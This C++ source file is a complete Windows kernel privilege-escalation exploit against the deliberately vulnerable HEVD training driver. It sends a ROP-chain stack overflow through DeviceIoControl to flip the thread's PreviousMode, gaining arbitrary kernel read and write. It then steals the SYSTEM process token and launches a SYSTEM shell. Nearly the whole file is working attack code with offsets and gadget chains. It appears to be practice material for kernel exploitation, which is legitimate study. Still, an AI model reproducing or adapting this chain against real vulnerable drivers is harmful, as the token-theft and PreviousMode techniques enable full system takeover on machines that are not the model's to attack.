#include "Common.h"
#include "Gadgets.h"
#include "Exploits.h"

/*
   HEVD Stack Overflow / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   Kernel ROP Playground

   Debugging:
   ba e1 hevd+0x865A9
   ba e1 hevd+0x866BF
   g

   == Common ROP Chains ==
	1. Resolve & call NtProtectVirtualMemory to make kernel memory we know where it is executeable
	   * GetModuleHandle, GetProcAddress, NtProtectVirtualMemory, Restore Execution Flow
	2. Resolve & call WriteProcessMemory to write sc to non writeable page (it uses VirtualProtect internally)
	   * GetModuleHandle, GetProcAddress, WriteProcessMemory, Restore Execution Flow
	3. Flip PreviousMode in _KTHREAD to make this a Kernel Thread (used here)
	   * Find KThread, Write 0 into kThread +0x232 (get offset via WinDBG), Restore Execution Flow

	Resources
	- https://acru3l.github.io/2018/10/20/ropping-through-shady-corners/
	- https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/
*/

namespace HevdStackOverflowRopMINS {

	const int offset = 2072;
	HANDLE hDriver;

	// this is only possible because previousmode=1
	QWORD arbRead(QWORD where) {
		QWORD readBuffer = 0;
		SIZE_T bytesRet = 0;
		if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)where, (LPVOID)&readBuffer, sizeof(QWORD), &bytesRet)) {
			printf("[!] Error while calling ReadProcessMemory(): %d\n", GetLastError()); 
		}
		return readBuffer;
	}

	// this is only possible because previousmode=1
	void arbWrite(QWORD where, QWORD what) {
		QWORD whatBuffer = what;
		ULONG bytesRet = 0;
		printf("[>] Writing %llx to %llx\n", what, where);
		getchar();
		/*
		 Ref: http://theevilbit.blogspot.com/2018/08/about-writeprocessmemory.html
		      https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/
		 1. It will check if you the API is being called from the kernel or user space (PreviousMode).
		 2. If you come from user mode, it will perform another check which is verifying the address range you are trying to write to, based on the MmUserProbeAddress variable, which points to the end of the user address space. On x64 machines this is a hardcoded value in the code, so there is no actual variable, as you can see below in IDA.
		 
		 So we can not just write to a kernel page with WriteProcessMemory - NtWriteVirtualMemory does not do this check.
		*/
		_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
		if (!pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)where, &whatBuffer, sizeof(QWORD), NULL)) {
			printf("[!] Error while calling pNtWriteVirtualMemory(): %d\n", GetLastError());
		}
		return;
	}


	void Exploit(int argc, char** argv) {
		hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		BYTE uBuffer[2120] = { 'A' };
		ResolveGadgets();

		// get base address of kernel (only works from medium integrity)
		QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");
		printf("[>] NT base: %llx\n", ntBase);

		PVOID kThread = GetkThread();
		if (!kThread)
		{
			printf("[!] Error while getting KTHREAD address\n");
			exit(1);
		}
		printf("[>] Setting KTHREAD PreviousMode to 1 via StackOverflow & ROP\n");
		int index = 0;
		// 6 gadgets would allow us to ret to the original stack pointer of the calling func (find via reversing/debugging)
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["POP_RAX_POP_RCX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = (QWORD)kThread + 0x232;  index += 1;			// KTHREAD.PreviousMode
		*(QWORD*)(uBuffer + offset + index * 8) = 0x0000000000000000; index += 1;				// NULL
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["MOV_RCX_PTRRAX"];  index += 1;
		// at this point we are allowed to read/write from/to kernel memory since we are considered a kernel thread
		// but we still have to restore execution flow	
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_RAX_RAX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_ESI_ESI"];  index += 1;

		getchar();
		// trigger
		DeviceIoControl(hDriver, 0x222003, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

		/*
		  With previousmode = 0 we can use readprocessmemory / writeprocessmemory for a read / write primitive, which allows to...
		  - U/S flip SMEP bypass
		  - HAL table overwrite into SC
		  - Data Only Attack on Token (*)
		 */

		 // find system EPROCESS & token		
		QWORD systemProc = getSystemEProcess();
		printf("[*] System _EPROCESS: 0x%llx\n", systemProc);
		DWORD currentProcessPid = GetCurrentProcessId();
		//printf("[*] Current Process PID %d\n", currentProcessPid);
		BOOL found = false;
		QWORD cProcess = systemProc;
		DWORD cPid = 0;
		QWORD cTokenPtr = 0;
		while (!found) {
			cProcess = arbRead(cProcess + 0x448); 
			cProcess -= 0x448; 
			cPid = arbRead(cProcess + 0x440);
			cTokenPtr = cProcess + 0x4b8;			
			if (cPid == currentProcessPid) {
				printf("[>] Current Process: %llx (PID: %d, TOKEN_PTR: %llx)\n", cProcess, cPid, cTokenPtr);
				found = true;
				break;
			}
		}
		if (!found) {
			printf("Could not find current process in ActiveProcessLinks\n");
			exit(-1);
		}
		printf("[*] Replacing Token\n");		
		arbWrite(cProcess + 0x4b8, arbRead(systemProc + 0x4b8));

		// we can not launch a system process with previous mode still set to zero! (nt!PspLocateInPEManifest+0xa9)
		// so we have to flip it back
		printf("[>] Setting KTHREAD PreviousMode to 0\n");
		index = 0;
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["POP_RAX_POP_RCX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = (QWORD)kThread + 0x232;  index += 1;			// KTHREAD.PreviousMode
		*(QWORD*)(uBuffer + offset + index * 8) = 0x0000000000000001; index += 1;				// 1
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["MOV_RCX_PTRRAX"];  index += 1;
		// at this point we are allowed to read/write from/to kernel memory since we are considered a kernel thread
		// but we still have to restore execution flow	
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_RAX_RAX"];  index += 1;
		*(QWORD*)(uBuffer + offset + index * 8) = ntBase + kernelGadgets["XOR_ESI_ESI"];  index += 1;
		// trigger
		DeviceIoControl(hDriver, 0x222003, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

		printf("[>] Enjoy your shell!\n");
		system("cmd.exe");
	}
}

int HevdStackOverflowRopMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("      HevdStackOverflowMI      \n");
	printf("~-----------------------------~\n");
	HevdStackOverflowRopMINS::Exploit(argc, argv);
	return 0;
}
